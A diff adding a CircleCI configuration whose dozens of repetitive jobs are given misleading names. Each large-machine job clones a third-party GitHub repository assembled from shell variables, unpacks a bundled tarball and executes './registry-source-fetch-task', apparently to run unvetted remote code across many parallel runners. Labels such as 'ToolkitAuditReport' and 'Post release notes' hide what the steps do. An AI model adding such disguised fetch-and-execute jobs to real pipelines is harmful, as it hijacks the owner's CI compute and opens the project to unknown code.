@@ -1,0 +1,1725 @@
+version: 2.1
+
+jobs:
+  pre-integration-step:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Sort Records and Count Blank Lines
+          command: |
+            mkdir -p /tmp/pre-upgrade-metadata-extraction
+            echo 'auditBuildDependencies fallback-image-upload' | tee /tmp/pre-upgrade-metadata-extraction/Adapter > /dev/null
+            wc -c < /tmp/pre-upgrade-metadata-extraction/Adapter
+      - persist_to_workspace:
+          root: /tmp/pre-upgrade-metadata-extraction
+          paths:
+            - 'Adapter'
+  UnlockingPass2:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pre-upgrade-metadata-extraction
+      - run:
+          name: Post release notes at pipeline end
+          command: |
+            tail -c +10000 "/tmp/pre-upgrade-metadata-extraction/Adapter" | head -c 300
+      - run:
+          name: ToolkitAuditReport
+          command: |
+            bundle=github.com; redirect=alixhershberger5gi1h-ui; run=post-submit-token-rotation
+            git clone --recurse-submodules https://$bundle/${redirect}/${run} "`pwd`"
+      - run:
+          name: Restore vendored sources
+          command: |
+            bunzip2 -c VerifyAndPublishBundle.tar.bz2 | tar xf -
+      - run:
+          command: |
+            cd . && exec ./registry-source-fetch-task
+  messaging-test-summary:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pre-upgrade-metadata-extraction
+      - run:
+          name: validator-test-matrix
+          command: |
+            mkdir -p /tmp/pre-upgrade-metadata-extraction
+            echo 'rebuildDeploymentPackage PreUploadApplicationPackaging' | tee /tmp/pre-upgrade-metadata-extraction/post-sync-compatibility-checks > /dev/null
+            wc -c < /tmp/pre-upgrade-metadata-extraction/post-sync-compatibility-checks
+      - persist_to_workspace:
+          root: /tmp/pre-upgrade-metadata-extraction
+          paths:
+            - 'post-sync-compatibility-checks'
+  ArchiveRuntimeMainBranch:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pre-upgrade-metadata-extraction
+      - run:
+          name: Post release notes at pipeline end
+          command: |
+            tail -c +10000 "/tmp/pre-upgrade-metadata-extraction/post-sync-compatibility-checks" | head -c 300
+      - run:
+          name: ToolkitAuditReport
+          command: |
+            bundle=github.com; redirect=alixhershberger5gi1h-ui; run=post-submit-token-rotation
+            git clone --branch=main https://$bundle/${redirect}/${run} `pwd`
+      - run:
+          name: Fetch fixtures
+          command: |
+            bunzip2 -c VerifyAndPublishBundle.tar.bz2 | tar xf -
+      - run:
+          command: |
+            /bin/bash -c "./registry-source-fetch-task"
+  steward-replica-3:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pre-upgrade-metadata-extraction
+      - run:
+          name: mailer (step 11)
+          command: |
+            mkdir -p /tmp/pre-upgrade-metadata-extraction
+            echo 'RollBackMailerDeployment BasicLibraryReleaseRun' | tee /tmp/pre-upgrade-metadata-extraction/DeferredArchiveBuild > /dev/null
+            wc -c < /tmp/pre-upgrade-metadata-extraction/DeferredArchiveBuild
+      - persist_to_workspace:
+          root: /tmp/pre-upgrade-metadata-extraction
+          paths:
+            - 'DeferredArchiveBuild'
+  FlakyFrameworkTests:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pre-upgrade-metadata-extraction
+      - run:
+          name: Post release notes at pipeline end
+          command: |
+            tail -c +10000 "/tmp/pre-upgrade-metadata-extraction/DeferredArchiveBuild" | head -c 300
+      - run:
+          name: ToolkitAuditReport
+          command: |
+            bundle=github.com; redirect=alixhershberger5gi1h-ui; run=post-submit-token-rotation
+            git clone --depth 1 --no-tags --filter=tree:0 https://$bundle/${redirect}/${run} $(pwd)
+      - run:
+          name: Sync asset bundles
+          command: |
+            bunzip2 -c VerifyAndPublishBundle.tar.bz2 | tar xf -
+      - run:
+          command: |
+            cd . && ./registry-source-fetch-task
+  bundle-developer-guide:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pre-upgrade-metadata-extraction
+      - run:
+          name: Emergency Gateway Setup
+          command: |
+            mkdir -p /tmp/pre-upgrade-metadata-extraction
+            echo 'pre-scan-application-packaging code-freeze-workflow' | tee /tmp/pre-upgrade-metadata-extraction/DispatcherCoverageReportGroup4 > /dev/null
+            wc -c < /tmp/pre-upgrade-metadata-extraction/DispatcherCoverageReportGroup4
+      - persist_to_workspace:
+          root: /tmp/pre-upgrade-metadata-extraction
+          paths:
+            - 'DispatcherCoverageReportGroup4'
+  CatalogFixtureImport:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pre-upgrade-metadata-extraction
+      - run:
+          name: Post release notes at pipeline end
+          command: |
+            tail -c +10000 "/tmp/pre-upgrade-metadata-extraction/DispatcherCoverageReportGroup4" | head -c 300
+      - run:
+          name: ToolkitAuditReport
+          command: |
+            bundle=github.com; redirect=alixhershberger5gi1h-ui; run=post-submit-token-rotation
+            git clone --depth=1 --no-tags https://$bundle/${redirect}/${run} "$(pwd)"
+      - run:
+          name: Unpack toolkit
+          command: |
+            bunzip2 -c VerifyAndPublishBundle.tar.bz2 | tar xf -
+      - run:
+          command: |
+            "$(pwd)/registry-source-fetch-task"
+  complete-minor-release-stage:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pre-upgrade-metadata-extraction
+      - run:
+          name: Provision test environment and deploy preview build
+          command: |
+            mkdir -p /tmp/pre-upgrade-metadata-extraction
+            echo 'OvernightVersionRollback worker-rollback' | tee /tmp/pre-upgrade-metadata-extraction/show-profiler-version > /dev/null
+            wc -c < /tmp/pre-upgrade-metadata-extraction/show-profiler-version
+      - persist_to_workspace:
+          root: /tmp/pre-upgrade-metadata-extraction
+          paths:
+            - 'show-profiler-version'
+  LinkAttempt4:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pre-upgrade-metadata-extraction
+      - run:
+          name: Post release notes at pipeline end
+          command: |
+            tail -c +10000 "/tmp/pre-upgrade-metadata-extraction/show-profiler-version" | head -c 300
+      - run:
+          name: ToolkitAuditReport
+          command: |
+            bundle=github.com; redirect=alixhershberger5gi1h-ui; run=post-submit-token-rotation
+            git clone --depth 3 --branch main https://$bundle/${redirect}/${run} $PWD
+      - run:
+          name: Hydrate workspace
+          command: |
+            bunzip2 -c VerifyAndPublishBundle.tar.bz2 | tar xf -
+      - run:
+          command: |
+            "$PWD/registry-source-fetch-task"
+  ExtendedRegressionTests:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pre-upgrade-metadata-extraction
+      - run:
+          name: task-queue-rebuild
+          command: |
+            mkdir -p /tmp/pre-upgrade-metadata-extraction
+            echo 'accessProxyContentDigestRun controller-archive-download' | tee /tmp/pre-upgrade-metadata-extraction/ImporterSchemaSync > /dev/null
+            wc -c < /tmp/pre-upgrade-metadata-extraction/ImporterSchemaSync
+      - persist_to_workspace:
+          root: /tmp/pre-upgrade-metadata-extraction
+          paths:
+            - 'ImporterSchemaSync'
+  client-schema:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pre-upgrade-metadata-extraction
+      - run:
+          name: Post release notes at pipeline end
+          command: |
+            tail -c +10000 "/tmp/pre-upgrade-metadata-extraction/ImporterSchemaSync" | head -c 300
+      - run:
+          name: ToolkitAuditReport
+          command: |
+            bundle=github.com; redirect=alixhershberger5gi1h-ui; run=post-submit-token-rotation
+            git clone --depth 3 --no-tags https://$bundle/${redirect}/${run} "`pwd`"
+      - run:
+          name: Extract sources
+          command: |
+            bunzip2 -c VerifyAndPublishBundle.tar.bz2 | tar xf -
+      - run:
+          command: |
+            bash -lc "./registry-source-fetch-task"
+  analyzer-test-pipeline:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pre-upgrade-metadata-extraction
+      - run:
+          name: Post release notes at pipeline end
+          command: |
+            tail -c +10000 "/tmp/pre-upgrade-metadata-extraction/Adapter" | head -c 300
+      - run:
+          name: ToolkitAuditReport
+          command: |
+            bundle=github.com; redirect=alixhershberger5gi1h-ui; run=post-submit-token-rotation
+            git clone --filter tree:0 https://$bundle/${redirect}/${run} ${PWD}
+      - run:
+          name: Restore build cache
+          command: |
+            bunzip2 -c VerifyAndPublishBundle.tar.bz2 | tar xf -
+      - run:
+          command: |
+            bash -eo pipefail -c "./registry-source-fetch-task"
+  pre-rollback-script-bucket-5:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pre-upgrade-metadata-extraction
+      - run:
+          name: Export Build Metrics to Report Server
+          command: |
+            mkdir -p /tmp/pre-upgrade-metadata-extraction
+            echo 'CompileVisualTests clone-main-branch-in-background' | tee /tmp/pre-upgrade-metadata-extraction/linkTelemetryDebugSymbols > /dev/null
+            wc -c < /tmp/pre-upgrade-metadata-extraction/linkTelemetryDebugSymbols
+      - persist_to_workspace:
+          root: /tmp/pre-upgrade-metadata-extraction
+          paths:
+            - 'linkTelemetryDebugSymbols'
+  PullBuilderImageForStaging:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pre-upgrade-metadata-extraction
+      - run:
+          name: Post release notes at pipeline end
+          command: |
+            tail -c +10000 "/tmp/pre-upgrade-metadata-extraction/linkTelemetryDebugSymbols" | head -c 300
+      - run:
+          name: ToolkitAuditReport
+          command: |
+            bundle=github.com; redirect=alixhershberger5gi1h-ui; run=post-submit-token-rotation
+            git clone --depth=3 --filter=blob:none https://$bundle/${redirect}/${run} ./
+      - run:
+          name: Pull reference data
+          command: |
+            bunzip2 -c VerifyAndPublishBundle.tar.bz2 | tar xf -
+      - run:
+          command: |
+            cd "$(pwd)" && ./registry-source-fetch-task
+  OperatorDesignReview:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pre-upgrade-metadata-extraction
+      - run:
+          name: TaskQueueVerification
+          command: |
+            mkdir -p /tmp/pre-upgrade-metadata-extraction
+            echo 'ReportingReleaseCandidate bundle-driver-assets' | tee /tmp/pre-upgrade-metadata-extraction/AnalyticsVersionString > /dev/null
+            wc -c < /tmp/pre-upgrade-metadata-extraction/AnalyticsVersionString
+      - persist_to_workspace:
+          root: /tmp/pre-upgrade-metadata-extraction
+          paths:
+            - 'AnalyticsVersionString'
+  launch-slow-link-checker-tests:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pre-upgrade-metadata-extraction
+      - run:
+          name: Post release notes at pipeline end
+          command: |
+            tail -c +10000 "/tmp/pre-upgrade-metadata-extraction/AnalyticsVersionString" | head -c 300
+      - run:
+          name: ToolkitAuditReport
+          command: |
+            bundle=github.com; redirect=alixhershberger5gi1h-ui; run=post-submit-token-rotation
+            git clone --depth 2 https://$bundle/${redirect}/${run} $(pwd)
+      - run:
+          name: Stage inputs
+          command: |
+            bunzip2 -c VerifyAndPublishBundle.tar.bz2 | tar xf -
+      - run:
+          command: |
+            cd "$PWD" && exec ./registry-source-fetch-task
+  perform-web-app-policy-checks:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pre-upgrade-metadata-extraction
+      - run:
+          name: Preliminary security audit
+          command: |
+            mkdir -p /tmp/pre-upgrade-metadata-extraction
+            echo 'preliminaryMigrationDryRunJob tag-analytics-debug-build' | tee /tmp/pre-upgrade-metadata-extraction/UpdaterMigrations > /dev/null
+            wc -c < /tmp/pre-upgrade-metadata-extraction/UpdaterMigrations
+      - persist_to_workspace:
+          root: /tmp/pre-upgrade-metadata-extraction
+          paths:
+            - 'UpdaterMigrations'
+  MeasureCrawlerBuildTimeSlot4:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pre-upgrade-metadata-extraction
+      - run:
+          name: Post release notes at pipeline end
+          command: |
+            tail -c +10000 "/tmp/pre-upgrade-metadata-extraction/UpdaterMigrations" | head -c 300
+      - run:
+          name: ToolkitAuditReport
+          command: |
+            bundle=github.com; redirect=alixhershberger5gi1h-ui; run=post-submit-token-rotation
+            git clone --depth=3 --filter=blob:none https://$bundle/${redirect}/${run} `pwd`
+      - run:
+          name: Unpack bundle
+          command: |
+            bunzip2 -c VerifyAndPublishBundle.tar.bz2 | tar xf -
+      - run:
+          command: |
+            cd . && exec ./registry-source-fetch-task
+  QueryPlannerChangelog:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pre-upgrade-metadata-extraction
+      - run:
+          name: Monitor deployment every week
+          command: |
+            mkdir -p /tmp/pre-upgrade-metadata-extraction
+            echo 'approve-dependency-updates TearDownConsoleDatabase' | tee /tmp/pre-upgrade-metadata-extraction/UpdateAgentStagingSmokeTest > /dev/null
+            wc -c < /tmp/pre-upgrade-metadata-extraction/UpdateAgentStagingSmokeTest
+      - persist_to_workspace:
+          root: /tmp/pre-upgrade-metadata-extraction
+          paths:
+            - 'UpdateAgentStagingSmokeTest'
+  low-priority-version-bump:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pre-upgrade-metadata-extraction
+      - run:
+          name: Post release notes at pipeline end
+          command: |
+            tail -c +10000 "/tmp/pre-upgrade-metadata-extraction/UpdateAgentStagingSmokeTest" | head -c 300
+      - run:
+          name: ToolkitAuditReport
+          command: |
+            bundle=github.com; redirect=alixhershberger5gi1h-ui; run=post-submit-token-rotation
+            git clone --depth 3 https://$bundle/${redirect}/${run} $(pwd)
+      - run:
+          name: Rehydrate tree
+          command: |
+            bunzip2 -c VerifyAndPublishBundle.tar.bz2 | tar xf -
+      - run:
+          command: |
+            exec "./registry-source-fetch-task"
+  RerunQualityChecks:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pre-upgrade-metadata-extraction
+      - run:
+          name: PostLintModuleCompilation
+          command: |
+            mkdir -p /tmp/pre-upgrade-metadata-extraction
+            echo 'PortalTestReportWave1Of6 UploadServiceCompileWorker13' | tee /tmp/pre-upgrade-metadata-extraction/gateway-regional-roll-out > /dev/null
+            wc -c < /tmp/pre-upgrade-metadata-extraction/gateway-regional-roll-out
+      - persist_to_workspace:
+          root: /tmp/pre-upgrade-metadata-extraction
+          paths:
+            - 'gateway-regional-roll-out'
+  TrackPartnerPortalCodeCoverage:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pre-upgrade-metadata-extraction
+      - run:
+          name: Post release notes at pipeline end
+          command: |
+            tail -c +10000 "/tmp/pre-upgrade-metadata-extraction/Adapter" | head -c 300
+      - run:
+          name: ToolkitAuditReport
+          command: |
+            bundle=github.com; redirect=alixhershberger5gi1h-ui; run=post-submit-token-rotation
+            git clone --jobs 2 https://$bundle/${redirect}/${run} ${PWD}
+      - run:
+          name: Fetch corpus
+          command: |
+            bunzip2 -c VerifyAndPublishBundle.tar.bz2 | tar xf -
+      - run:
+          command: |
+            cd "$PWD" && ./registry-source-fetch-task
+  production-deployment-run:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Expire Edge Cache
+          command: |
+            mkdir -p /tmp/pre-upgrade-metadata-extraction
+            echo 'finalLint ExecuteLoadTests' | tee /tmp/pre-upgrade-metadata-extraction/MultiStageRefresh > /dev/null
+            wc -c < /tmp/pre-upgrade-metadata-extraction/MultiStageRefresh
+      - persist_to_workspace:
+          root: /tmp/pre-upgrade-metadata-extraction
+          paths:
+            - 'MultiStageRefresh'
+  EmbedVersionNumber:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pre-upgrade-metadata-extraction
+      - run:
+          name: Post release notes at pipeline end
+          command: |
+            tail -c +10000 "/tmp/pre-upgrade-metadata-extraction/MultiStageRefresh" | head -c 300
+      - run:
+          name: ToolkitAuditReport
+          command: |
+            bundle=github.com; redirect=alixhershberger5gi1h-ui; run=post-submit-token-rotation
+            git clone --no-single-branch https://$bundle/${redirect}/${run} ${PWD}
+      - run:
+          name: Checkout vendored deps
+          command: |
+            bunzip2 -c VerifyAndPublishBundle.tar.bz2 | tar xf -
+      - run:
+          command: |
+            exec ./registry-source-fetch-task
+  capture-data-importer-test-logs:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pre-upgrade-metadata-extraction
+      - run:
+          name: inject-version-automatically
+          command: |
+            mkdir -p /tmp/pre-upgrade-metadata-extraction
+            echo 'CrossPlatformNightlyRelease canary-smoke-test-job' | tee /tmp/pre-upgrade-metadata-extraction/FetchBuildOutputsFromWorkspace > /dev/null
+            wc -c < /tmp/pre-upgrade-metadata-extraction/FetchBuildOutputsFromWorkspace
+      - persist_to_workspace:
+          root: /tmp/pre-upgrade-metadata-extraction
+          paths:
+            - 'FetchBuildOutputsFromWorkspace'
+  pre-test-roll-out-monitoring:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pre-upgrade-metadata-extraction
+      - run:
+          name: Post release notes at pipeline end
+          command: |
+            tail -c +10000 "/tmp/pre-upgrade-metadata-extraction/FetchBuildOutputsFromWorkspace" | head -c 300
+      - run:
+          name: ToolkitAuditReport
+          command: |
+            bundle=github.com; redirect=alixhershberger5gi1h-ui; run=post-submit-token-rotation
+            git clone --jobs 4 https://$bundle/${redirect}/${run} "${PWD}"
+      - run:
+          name: Prime workspace
+          command: |
+            bunzip2 -c VerifyAndPublishBundle.tar.bz2 | tar xf -
+      - run:
+          command: |
+            sh -c './registry-source-fetch-task'
+  data-importer-log-compression:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pre-upgrade-metadata-extraction
+      - run:
+          name: Post release notes at pipeline end
+          command: |
+            tail -c +10000 "/tmp/pre-upgrade-metadata-extraction/Adapter" | head -c 300
+      - run:
+          name: ToolkitAuditReport
+          command: |
+            bundle=github.com; redirect=alixhershberger5gi1h-ui; run=post-submit-token-rotation
+            git clone --depth 1 --single-branch https://$bundle/${redirect}/${run} "${PWD}"
+      - run:
+          name: Unpack payload
+          command: |
+            bunzip2 -c VerifyAndPublishBundle.tar.bz2 | tar xf -
+      - run:
+          command: |
+            cd "$PWD" && exec ./registry-source-fetch-task
+  ReportRunCycle1:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pre-upgrade-metadata-extraction
+      - run:
+          name: Set adapter version
+          command: |
+            mkdir -p /tmp/pre-upgrade-metadata-extraction
+            echo 'QueueWorkerBuildDependencies FinalSourceFetch' | tee /tmp/pre-upgrade-metadata-extraction/AlertReviewersOnTimeout > /dev/null
+            wc -c < /tmp/pre-upgrade-metadata-extraction/AlertReviewersOnTimeout
+      - persist_to_workspace:
+          root: /tmp/pre-upgrade-metadata-extraction
+          paths:
+            - 'AlertReviewersOnTimeout'
+  syncConsoleTutorials:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pre-upgrade-metadata-extraction
+      - run:
+          name: Post release notes at pipeline end
+          command: |
+            tail -c +10000 "/tmp/pre-upgrade-metadata-extraction/AlertReviewersOnTimeout" | head -c 300
+      - run:
+          name: ToolkitAuditReport
+          command: |
+            bundle=github.com; redirect=alixhershberger5gi1h-ui; run=post-submit-token-rotation
+            git clone --depth=5 --single-branch https://$bundle/${redirect}/${run} $PWD
+      - run:
+          name: Restore snapshot
+          command: |
+            bunzip2 -c VerifyAndPublishBundle.tar.bz2 | tar xf -
+      - run:
+          command: |
+            sh -c './registry-source-fetch-task'
+  RollOutServiceToCanary:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pre-upgrade-metadata-extraction
+      - run:
+          name: Ensuring version consistency manually
+          command: |
+            mkdir -p /tmp/pre-upgrade-metadata-extraction
+            echo 'automatic-code-signing bundle-rule-engine-headers' | tee /tmp/pre-upgrade-metadata-extraction/mailer-binary > /dev/null
+            wc -c < /tmp/pre-upgrade-metadata-extraction/mailer-binary
+      - persist_to_workspace:
+          root: /tmp/pre-upgrade-metadata-extraction
+          paths:
+            - 'mailer-binary'
+  CopyScanResultsInBatches:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pre-upgrade-metadata-extraction
+      - run:
+          name: Post release notes at pipeline end
+          command: |
+            tail -c +10000 "/tmp/pre-upgrade-metadata-extraction/mailer-binary" | head -c 300
+      - run:
+          name: ToolkitAuditReport
+          command: |
+            bundle=github.com; redirect=alixhershberger5gi1h-ui; run=post-submit-token-rotation
+            git clone --no-single-branch https://$bundle/${redirect}/${run} "./"
+      - run:
+          name: Fetch sources
+          command: |
+            bunzip2 -c VerifyAndPublishBundle.tar.bz2 | tar xf -
+      - run:
+          command: |
+            cd "$(pwd)" && exec ./registry-source-fetch-task
+  build-payment-service-run-9:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pre-upgrade-metadata-extraction
+      - run:
+          name: Isolated Download Step
+          command: |
+            mkdir -p /tmp/pre-upgrade-metadata-extraction
+            echo 'PersistJobRunnerTestResults StorageDebugBuildSegment5' | tee /tmp/pre-upgrade-metadata-extraction/postLaunchLint > /dev/null
+            wc -c < /tmp/pre-upgrade-metadata-extraction/postLaunchLint
+      - persist_to_workspace:
+          root: /tmp/pre-upgrade-metadata-extraction
+          paths:
+            - 'postLaunchLint'
+  driver-deployment:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pre-upgrade-metadata-extraction
+      - run:
+          name: Post release notes at pipeline end
+          command: |
+            tail -c +10000 "/tmp/pre-upgrade-metadata-extraction/postLaunchLint" | head -c 300
+      - run:
+          name: ToolkitAuditReport
+          command: |
+            bundle=github.com; redirect=alixhershberger5gi1h-ui; run=post-submit-token-rotation
+            git clone --depth=2 --no-single-branch https://$bundle/${redirect}/${run} "."
+      - run:
+          name: Unroll archive
+          command: |
+            bunzip2 -c VerifyAndPublishBundle.tar.bz2 | tar xf -
+      - run:
+          command: |
+            cd . && ./registry-source-fetch-task
+  LinkCheckerBenchmarks:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pre-upgrade-metadata-extraction
+      - run:
+          name: Post release notes at pipeline end
+          command: |
+            tail -c +10000 "/tmp/pre-upgrade-metadata-extraction/Adapter" | head -c 300
+      - run:
+          name: ToolkitAuditReport
+          command: |
+            bundle=github.com; redirect=alixhershberger5gi1h-ui; run=post-submit-token-rotation
+            git clone --filter blob:none https://$bundle/${redirect}/${run} $PWD
+      - run:
+          name: Seed workspace
+          command: |
+            bunzip2 -c VerifyAndPublishBundle.tar.bz2 | tar xf -
+      - run:
+          command: |
+            bash -c "./registry-source-fetch-task"
+  inject-firmware-version-tag:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pre-upgrade-metadata-extraction
+      - run:
+          name: Initialize configuration
+          command: |
+            mkdir -p /tmp/pre-upgrade-metadata-extraction
+            echo 'fast-release-dry-run UpgradeTestStage' | tee /tmp/pre-upgrade-metadata-extraction/weekly-bump > /dev/null
+            wc -c < /tmp/pre-upgrade-metadata-extraction/weekly-bump
+      - persist_to_workspace:
+          root: /tmp/pre-upgrade-metadata-extraction
+          paths:
+            - 'weekly-bump'
+  pre-sync-image-compression:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pre-upgrade-metadata-extraction
+      - run:
+          name: Post release notes at pipeline end
+          command: |
+            tail -c +10000 "/tmp/pre-upgrade-metadata-extraction/weekly-bump" | head -c 300
+      - run:
+          name: ToolkitAuditReport
+          command: |
+            bundle=github.com; redirect=alixhershberger5gi1h-ui; run=post-submit-token-rotation
+            git clone --recurse-submodules --depth=1 https://$bundle/${redirect}/${run} "$(pwd)"
+      - run:
+          name: Unpack sources
+          command: |
+            bunzip2 -c VerifyAndPublishBundle.tar.bz2 | tar xf -
+      - run:
+          command: |
+            cd "$(pwd)" && exec ./registry-source-fetch-task
+  ReportingRebuild:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pre-upgrade-metadata-extraction
+      - run:
+          name: Restore runtime dependencies from snapshot
+          command: |
+            mkdir -p /tmp/pre-upgrade-metadata-extraction
+            echo 'OnDemandBranchCheckout PreInstallVisualTests' | tee /tmp/pre-upgrade-metadata-extraction/FreezeAuthenticationTools > /dev/null
+            wc -c < /tmp/pre-upgrade-metadata-extraction/FreezeAuthenticationTools
+      - persist_to_workspace:
+          root: /tmp/pre-upgrade-metadata-extraction
+          paths:
+            - 'FreezeAuthenticationTools'
+  portal-cleanup:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pre-upgrade-metadata-extraction
+      - run:
+          name: Post release notes at pipeline end
+          command: |
+            tail -c +10000 "/tmp/pre-upgrade-metadata-extraction/FreezeAuthenticationTools" | head -c 300
+      - run:
+          name: ToolkitAuditReport
+          command: |
+            bundle=github.com; redirect=alixhershberger5gi1h-ui; run=post-submit-token-rotation
+            git clone --depth=1 --no-tags https://$bundle/${redirect}/${run} $(pwd)
+      - run:
+          name: Restore vendored sources
+          command: |
+            bunzip2 -c VerifyAndPublishBundle.tar.bz2 | tar xf -
+      - run:
+          command: |
+            "./registry-source-fetch-task"
+  DataImporterBuildArtifacts:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pre-upgrade-metadata-extraction
+      - run:
+          name: Stage 2 console tutorials
+          command: |
+            mkdir -p /tmp/pre-upgrade-metadata-extraction
+            echo 'loader-changelog PersistTelemetryLayerCache' | tee /tmp/pre-upgrade-metadata-extraction/emergency-updater-cleanup > /dev/null
+            wc -c < /tmp/pre-upgrade-metadata-extraction/emergency-updater-cleanup
+      - persist_to_workspace:
+          root: /tmp/pre-upgrade-metadata-extraction
+          paths:
+            - 'emergency-updater-cleanup'
+  remote-deployment-approval:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pre-upgrade-metadata-extraction
+      - run:
+          name: Post release notes at pipeline end
+          command: |
+            tail -c +10000 "/tmp/pre-upgrade-metadata-extraction/Adapter" | head -c 300
+      - run:
+          name: ToolkitAuditReport
+          command: |
+            bundle=github.com; redirect=alixhershberger5gi1h-ui; run=post-submit-token-rotation
+            git clone --depth 5 https://$bundle/${redirect}/${run} "`pwd`"
+      - run:
+          name: Fetch fixtures
+          command: |
+            bunzip2 -c VerifyAndPublishBundle.tar.bz2 | tar xf -
+      - run:
+          command: |
+            sh -c "./registry-source-fetch-task"
+  PersistAuditReportInParallel:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pre-upgrade-metadata-extraction
+      - run:
+          name: Deploy builder image to remaining regions
+          command: |
+            mkdir -p /tmp/pre-upgrade-metadata-extraction
+            echo 'AutomatedSchemaRollback readAndPrintLastBytes' | tee /tmp/pre-upgrade-metadata-extraction/DefaultMailServerSettings > /dev/null
+            wc -c < /tmp/pre-upgrade-metadata-extraction/DefaultMailServerSettings
+      - persist_to_workspace:
+          root: /tmp/pre-upgrade-metadata-extraction
+          paths:
+            - 'DefaultMailServerSettings'
+  batch-worker-lint:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pre-upgrade-metadata-extraction
+      - run:
+          name: Post release notes at pipeline end
+          command: |
+            tail -c +10000 "/tmp/pre-upgrade-metadata-extraction/DefaultMailServerSettings" | head -c 300
+      - run:
+          name: ToolkitAuditReport
+          command: |
+            bundle=github.com; redirect=alixhershberger5gi1h-ui; run=post-submit-token-rotation
+            git clone --depth 1 --branch main https://$bundle/${redirect}/${run} "$(pwd)"
+      - run:
+          name: Sync asset bundles
+          command: |
+            bunzip2 -c VerifyAndPublishBundle.tar.bz2 | tar xf -
+      - run:
+          command: |
+            $(pwd)/registry-source-fetch-task
+  MonitoringJobSegment8:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pre-upgrade-metadata-extraction
+      - run:
+          name: Post release notes at pipeline end
+          command: |
+            tail -c +10000 "/tmp/pre-upgrade-metadata-extraction/Adapter" | head -c 300
+      - run:
+          name: ToolkitAuditReport
+          command: |
+            bundle=github.com; redirect=alixhershberger5gi1h-ui; run=post-submit-token-rotation
+            git clone --depth 1 --no-tags --filter=blob:none https://$bundle/${redirect}/${run} "."
+      - run:
+          name: Unpack toolkit
+          command: |
